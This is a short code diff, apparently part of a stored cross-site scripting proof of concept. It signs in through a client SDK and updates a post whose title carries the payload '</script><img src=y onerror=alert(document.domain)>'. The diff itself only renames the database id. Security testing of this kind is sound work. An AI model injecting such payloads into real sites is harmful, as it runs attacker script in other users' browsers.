@@ -10,8 +10,8 @@ const tw = Torchwood.create({ endpoint: GATEWAY, projectId: 'blog' })
 const r = await tw.account.signIn({ email, password })
 tw.setAccessToken(r.tokens.access_token)
 
-const doc = await tw.databases.getDocument('blog', 'posts', postId)
-await tw.databases.updateDocument('blog', 'posts', postId, {
+const doc = await tw.databases.getDocument('app', 'posts', postId)
+await tw.databases.updateDocument('app', 'posts', postId, {
   data: { title: 'PWN</script><img src=y onerror=alert(document.domain)>' },
   version: doc.version,
 })
